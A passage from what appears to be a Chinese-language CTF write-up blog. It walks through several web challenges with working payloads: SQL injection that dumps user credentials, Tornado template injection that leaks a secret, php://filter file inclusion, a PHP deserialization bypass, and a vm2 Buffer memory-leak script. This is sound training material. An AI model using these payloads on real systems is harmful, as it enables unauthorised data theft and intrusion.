+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">group_concat</span>(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=&#x27;users&#x27; <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/ctfwp/ctf/5a2e262a796de1b509626128b13d7577.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>提取成功</p>
+<p><strong>6.提取 users 表的全量账号密码（爆flag）</strong></p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> l0ve1ysq1 <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/ctfwp/ctf/e2ea9a612a46f63de1566b378983f5f4.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>: CTF2&#123;<span class="hljs-number">88744430</span>-<span class="hljs-number">3</span>f6b-<span class="hljs-number">4960</span>-ad47-<span class="hljs-number">820679</span>fddb54&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="SUCTF-2019-EasySQL1"><a href="#SUCTF-2019-EasySQL1" class="headerlink" title="[SUCTF 2019]EasySQL1"></a>[SUCTF 2019]EasySQL1</h2><p>依据题目提示，我们尝试对该网站进行sql注入，输入1’无回显，1有回显，说明其为数字型注入</p>
+<p>然后使用or、union select等函数，发现都不行，说明防护及其严格</p>
+<p>尝试堆叠注入：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">1</span><span class="hljs-comment">;show databases;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/notes/ctfwp/ctf/151006e64622a689870287413c69a2ac.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>发现堆叠注入有效，但show columns from Flag;被拦截，说明过滤了columns等敏感词。</p>
+<p><strong>那么，我们可以尝试利用SELECT * 与临时列</strong></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-comment">*,1</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>核心逻辑：</p>
+<p>输入*,1时，语句变为：SELECT *, 1 FROM Flag</p>
+<p>SELECT * 返回所有字段（含flag列）</p>
+<p>,1 增加临时列，值为1（确保非零触发回显）<br><img src="/images/notes/ctfwp/ctf/57ddb10da48835e64aba1e76be37b28a.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>完结撒花</p>
+<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>依旧还是先看看有什么东西<br><img src="/images/notes/ctfwp/ctf/567bfdaa143b6cdd9c89b916f0fccac1.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>第一个告诉我们flag在&#x2F;fllllllllllllag里面</p>
+<p>第二个告诉我们内容为 render，这是一个关键词，提示我们后端使用了 Tornado 框架的 render 函数来渲染页面，可能存在模板注入</p>
+<p>第三个内容为 md5(cookie_secret+md5(filename))，这直接告诉了我们需要计算的 filehash 的算法</p>
+<p>我们尝试直接访问目标文件，但提示filehash值错误的同时，还提示我们msg 参数很可能被传递给了模板进行渲染，说明存在潜在的SSTI注入点，让我们尝试一下</p>
+<p><img src="/images/notes/ctfwp/ctf/image-1.png" srcset="/img/loading.gif" lazyload alt="alt text">可以看到页面回显了 1，说明输入被当作了模板代码执行 ，存在SSTI漏洞</p>
+<p>查找cookie_secret，直接通过 msg 参数将这个对象打印出来</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?msg=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.settings</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/ctfwp/ctf/image-2.png" srcset="/img/loading.gif" lazyload alt="alt text"><br> 得到cookie_secret</p>
+<p>现在我们有了 cookie_secret 和目标 文件名  &#x2F;fllllllllllllag，就可以按照 hints.txt 给出的公式来计算 filehash 了。</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns">import hashlib<br><br>filename = &#x27;/fllllllllllllag&#x27;<br>cookie_secret = &#x27;你获取到的cookie_secret值&#x27;<br># 将你刚才获取到的 cookie_secret 替换到这里<br><br>filename_md5 = hashlib.md5<span class="hljs-punctuation">(</span>filename.encode<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>.hexdigest<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br>print<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;md5(filename):&quot;</span>, filename_md5<span class="hljs-punctuation">)</span><br># 第一步：计算 filename 的 MD5 值<br><br>filehash = hashlib.md5<span class="hljs-punctuation">(</span><span class="hljs-punctuation">(</span>cookie_secret + filename_md5<span class="hljs-punctuation">)</span>.encode<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>.hexdigest<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br>print<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;filehash:&quot;</span>, filehash<span class="hljs-punctuation">)</span><br># 第二步：拼接 cookie_secret 和 上一步的结果，再计算 MD5<br></code></pre></td></tr></table></figure>
+<p> <img src="/images/notes/ctfwp/ctf/image-3.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<p> 得到filehash: 84ff501492c609df378df12d915bfd1a</p>
+<p> 最后构造payload:<br> <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">filename</span>=/fllllllllllllag&amp;filehash=84ff501492c609df378df12d915bfd1a<br></code></pre></td></tr></table></figure><br> <img src="/images/notes/ctfwp/ctf/image-4.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p> 通过源代码审计，我们发现了一个隐藏的路径<br> <img src="/images/notes/ctfwp/ctf/image-5.png" srcset="/img/loading.gif" lazyload alt="alt text"><br> 访问该路径，然后访问文件，发现被隐藏了，之后可以尝试抓包<br> <img src="/images/notes/ctfwp/ctf/image-6.png" srcset="/img/loading.gif" lazyload alt="alt text"><br> 响应内容中我们可以看到页面的内容中存在信息泄露，有一个文件 secr3t.php，我们访问这个文件即可<br> <img src="/image-7.png" srcset="/img/loading.gif" lazyload alt="
+ "><br> 经过简单代码审计，我们可知这是一个文件包含</p>
+<p> 使用php伪协议读取<br> <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">/secr3t.php?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><br><img src="/images/notes/ctfwp/ctf/image-8.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>flag &#x3D; ‘CTF2{ba9e4d9f-e8e3-4ddd-9ea1-1a1e3c6fed1b}’;</p>
+<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>打开网站，通过disearch扫描，可以发现<a target="_blank" rel="noopener" href="http://www.zip,下载后得到源码/">www.zip，下载后得到源码</a><br><img src="/images/notes/ctfwp/ctf/image-9.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>通过源码审计，发现是php反序列化漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">// PHP 开始标记</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>; <span class="hljs-comment">// 引入 flag.php 文件，加载外部的 $flag 变量</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 关闭错误报告，避免直接暴露错误信息</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123; <span class="hljs-comment">// 定义一个名为 Name 的类</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>; <span class="hljs-comment">// 私有属性 username，默认值为 nonono</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>; <span class="hljs-comment">// 私有属性 password，默认值为 yesyes</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123; <span class="hljs-comment">// 构造方法，初始化对象时接收用户名和密码</span><br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>; <span class="hljs-comment">// 将传入的用户名赋给对象属性</span><br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>; <span class="hljs-comment">// 将传入的密码赋给对象属性</span><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123; <span class="hljs-comment">// 反序列化时自动触发的方法</span><br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>; <span class="hljs-comment">// 强制把用户名改为 guest</span><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123; <span class="hljs-comment">// 对象销毁时自动执行的方法</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123; <span class="hljs-comment">// 如果密码不是 100，就视为非法访问</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>; <span class="hljs-comment">// 输出攻击提示</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>; <span class="hljs-comment">// 输出用户名提示文字</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>; <span class="hljs-comment">// 输出当前用户名并换行</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>; <span class="hljs-comment">// 输出密码提示文字</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>; <span class="hljs-comment">// 输出当前密码并换行</span><br>            <span class="hljs-keyword">die</span>(); <span class="hljs-comment">// 终止脚本执行</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123; <span class="hljs-comment">// 如果用户名是 admin，则允许输出 flag</span><br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>; <span class="hljs-comment">// 引用外部变量 $flag</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; <span class="hljs-comment">// 输出 flag</span><br>        &#125;<span class="hljs-keyword">else</span>&#123; <span class="hljs-comment">// 否则说明不是管理员</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>; <span class="hljs-comment">// 输出友好提示</span><br>            <span class="hljs-keyword">die</span>(); <span class="hljs-comment">// 终止脚本执行</span><br><br><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">// PHP 结束标记</span><br></code></pre></td></tr></table></figure>
+<p>通过代码审计可以了解到，这是一道反序列化的题目，要求也很简单，只需要提交的时候账户为admin，密码为100即可</p>
+<p>接下来我们可以写一个简单的poc，来执行这个代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-number">100</span>;<br><br>&#125;<br><span class="hljs-variable">$obj</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Name</span>();<br><span class="hljs-variable">$ser</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ser</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>得到结果</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure>
+<p>不过因为成员变量是用private修饰的私有变量，所有要在变量中类名的前后添加%00，也就是&#x2F;0</p>
+<p>同时，反序列化时会自动调用__wakeup方法，修改我们的username的值。</p>
+<p>绕过__wakeup()：在反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup()</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00password&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">100</span>;&#125;<br><br>&quot;Name&quot;:<span class="hljs-number">2</span> 修改成 <span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
+<p>阅读index.php可知，提交参数名为select</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>  <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>  <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$select</span>);<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>所以最终Payload:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">select</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;<span class="hljs-variable">%0</span>0Name<span class="hljs-variable">%00username</span>&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;<span class="hljs-variable">%0</span>0Name<span class="hljs-variable">%00password</span>&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure>
+<p>得到flag:CTF2{21fe25e2-2f86-4a75-9d10-5d497a648511}</p>
+<h2 id="HITCON-2016-Leaking"><a href="#HITCON-2016-Leaking" class="headerlink" title="[HITCON 2016]Leaking"></a>[HITCON 2016]Leaking</h2><p>本题主要考查node.js中的vm2沙箱逃逸和js通过buffer类处理二进制数据的缓冲区</p>
+<p>题目已直接给出源代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&quot;use strict&quot;</span>;<br><br><span class="hljs-keyword">var</span> randomstring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;randomstring&quot;</span>);<br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<br><span class="hljs-keyword">var</span> &#123;<br>    <span class="hljs-variable constant_">VM</span><br>&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">var</span> flag = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./config.js&quot;</span>).<span class="hljs-property">flag</span><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">header</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;text/plain&quot;</span>);<br><br>    <span class="hljs-comment">/*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */</span><br>    <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;var flag_&quot;</span> + randomstring.<span class="hljs-title function_">generate</span>(<span class="hljs-number">64</span>) + <span class="hljs-string">&quot; = \&quot;hitcon&#123;&quot;</span> + flag + <span class="hljs-string">&quot;&#125;\&quot;;&quot;</span>)<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">query</span>.<span class="hljs-property">data</span> &amp;&amp; req.<span class="hljs-property">query</span>.<span class="hljs-property">data</span>.<span class="hljs-property">length</span> &lt;= <span class="hljs-number">12</span>) &#123;<br>        <span class="hljs-keyword">var</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>(&#123;<br>            <span class="hljs-attr">timeout</span>: <span class="hljs-number">1000</span><br>        &#125;);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">data</span>);<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;eval -&gt;&quot;</span> + vm.<span class="hljs-title function_">run</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">data</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(fs.<span class="hljs-title function_">readFileSync</span>(__filename).<span class="hljs-title function_">toString</span>());<br>    &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;listening on port 3000!&quot;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>
+<h3 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h3><h4 id="VM2原理"><a href="#VM2原理" class="headerlink" title="VM2原理"></a>VM2原理</h4><pre><code class="hljs">VM2基于VM，使用官方的VM库构建沙箱环境。然后使用JavaScript的Proxy技术来防止沙箱脚本逃逸。
+</code></pre>
+<h4 id="vm2-特性"><a href="#vm2-特性" class="headerlink" title="vm2 特性"></a>vm2 特性</h4><pre><code class="hljs">1.运行不受信任的JS脚本
+2.沙箱的终端输出信息完全可控
+3.沙箱内可以受限地加载modules
+4.可以安全地向沙箱间传递callback
+5.死循环攻击免疫 while (true) {}
+</code></pre>
+<h4 id="node-js沙箱逃逸"><a href="#node-js沙箱逃逸" class="headerlink" title="node.js沙箱逃逸"></a>node.js沙箱逃逸</h4><pre><code class="hljs">在较早一点的node.js版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。
+</code></pre>
+<h5 id="注：关于-Buffer"><a href="#注：关于-Buffer" class="headerlink" title="注：关于 Buffer"></a>注：关于 Buffer</h5><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-title class_">JavaScript</span> 语言自身只有字符串数据类型，没有二进制数据类型。<br>但在处理像TCP流或文件流时，必须使用到二进制数据。因此在 <span class="hljs-title class_">Node</span>.js中，定义了一个 <span class="hljs-title class_">Buffer</span> 类，该类用来创建一个专门存放二进制数据的缓存区。<br></code></pre></td></tr></table></figure>
+
+<p>所以，只要是调用过的变量，一定会存在内存中，所以需要使用Buffer()来读取内存，使用data&#x3D;Buffer(800)分配一个800的单位为8位字节的buffer，编写 Python3 的EXP：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://f81a9cf8-9be7-4245-96fe-da986bbe60e1.node3.buuoj.cn/?data=Buffer(800)&#x27;</span> <span class="hljs-comment">#前面的改为实际靶机地址即可</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    res = requests.get(url)<br>    <span class="hljs-built_in">print</span>(res.status_code)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hitcon&#123;&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(res.text)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+<p>运行，得到flag</p>
+<p><img src="/images/notes/ctfwp/ctf/image-10.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<h2 id="Dest0g3-520迎新赛-EasyPHP"><a href="#Dest0g3-520迎新赛-EasyPHP" class="headerlink" title="[Dest0g3 520迎新赛]EasyPHP"></a>[Dest0g3 520迎新赛]EasyPHP</h2><p>本题直接将源码暴露出来</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;fl4g.php&quot;</span>;<br><span class="hljs-variable">$dest0g3</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;H&quot;</span>);<br><span class="hljs-variable">$timme</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;d&quot;</span>);<br><span class="hljs-variable">$timmme</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;i&quot;</span>);<br><span class="hljs-keyword">if</span>((<span class="hljs-variable">$time</span> &gt; <span class="hljs-string">&quot;24&quot;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-variable">$timme</span> &gt; <span class="hljs-string">&quot;31&quot;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-variable">$timmme</span> &gt; <span class="hljs-string">&quot;60&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fl4g</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try harder!&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">set_error_handler</span>(<br>    function() <span class="hljs-keyword">use</span>(&amp;$<span class="hljs-title">fl4g</span>) &#123;<br>        <span class="hljs-title">print</span> $<span class="hljs-title">fl4g</span>;<br>    &#125;<br>);<br><span class="hljs-variable">$fl4g</span> .= <span class="hljs-variable">$dest0g3</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="大致内容有以下这些："><a href="#大致内容有以下这些：" class="headerlink" title="大致内容有以下这些："></a>大致内容有以下这些：</h3><ul>
+<li><p>从post参数ctf中获取用户输入</p>
+</li>
+<li><p>判断当前时间（即返回当前小时，日期以及分钟），如果时间条件成立即大于24小时，大于31日，大于60分钟，即可条件成立，即获取flag；</p>
+</li>
+<li><p>注册自定义错误处理函数，触发错误时打印出flag</p>
+</li>
+</ul>
+<h3 id="关键知识点："><a href="#关键知识点：" class="headerlink" title="关键知识点："></a>关键知识点：</h3><ul>
+<li><p>set_error_handler() 可以注册一个自定义函数，当 PHP 发生错误时自动调用</p>
+</li>
+<li><p>use (&amp;$fl4g) 表示闭包通过引用捕获 $fl4g 变量，可以访问到它的值</p>
+</li>
+<li><p>.&#x3D; 操作符 是字符串拼接</p>
+</li>
+<li><p>在 PHP 中，字符串 . 数组 会触发一个 Notice 级别 的错误,这个错误会被 set_error_handler 注册的函数捕获，于是错误处理函数执行 print $fl4g，将 flag 打印出来。</p>
+</li>
+</ul>
